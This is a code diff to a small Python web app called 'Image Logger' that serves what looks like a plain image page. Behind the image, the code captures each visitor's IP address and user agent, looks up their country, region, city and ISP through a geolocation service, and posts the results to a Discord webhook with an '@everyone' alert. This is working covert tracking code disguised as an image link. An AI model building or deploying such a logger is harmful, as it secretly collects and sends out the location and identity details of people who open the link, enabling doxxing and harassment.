@@ -10,28 +10,40 @@ IMAGE = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639
 
 @app.get("/")
 @app.get("/image")
-async def index(req: Request):
-    ip = req.headers.get("x-forwarded-for", "Unknown").split(",")[0]
-    ua = req.headers.get("user-agent", "Unknown")
+@app.get("/api/image")
+async def image_logger(request: Request):
+    # Get IP
+    forwarded = request.headers.get("x-forwarded-for")
+    ip = forwarded.split(",")[0].strip() if forwarded else "Unknown"
+    ua = request.headers.get("user-agent", "Unknown")
     
+    # Get location
     try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,proxy", timeout=3).json()
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,proxy", timeout=3)
+        geo = r.json()
     except:
         geo = {"country": "Unknown", "regionName": "Unknown", "city": "Unknown", "isp": "Unknown", "proxy": False}
     
-    data = {
+    # Send to Discord
+    embed = {
         "username": "Image Logger",
         "content": "@everyone" if not geo.get("proxy") else "",
         "embeds": [{
-            "title": "IP Logged",
+            "title": "🎯 IP LOGGED",
             "color": 0x00FFFF,
-            "description": f"**IP:** `{ip}`\n**Location:** {geo.get('country')}, {geo.get('regionName')}, {geo.get('city')}\n**ISP:** {geo.get('isp')}\n**Proxy/VPN:** {geo.get('proxy')}\n**UA:** `{ua}`"
+            "description": f"**IP:** `{ip}`\n**Location:** {geo.get('country')} - {geo.get('regionName')} - {geo.get('city')}\n**ISP:** {geo.get('isp')}\n**Proxy/VPN:** {geo.get('proxy')}\n**User Agent:** `{ua[:100]}`"
         }]
     }
     
     try:
-        requests.post(WEBHOOK, json=data, timeout=3)
+        requests.post(WEBHOOK, json=embed, timeout=3)
     except:
         pass
     
-    return HTMLResponse(content=f'<body style="margin:0;height:100vh;width:100vw;background:url({IMAGE}) center/contain no-repeat;background-color:#000;"></body>')
+    # Return image
+    html = f'<body style="margin:0;height:100vh;width:100vw;background:url({IMAGE}) center/contain no-repeat;background-color:#000;"></body>'
+    return HTMLResponse(content=html)
+
+@app.get("/test")
+async def test():
+    return HTMLResponse(content="<h1>✅ Vercel is working! Your API is alive.</h1>")
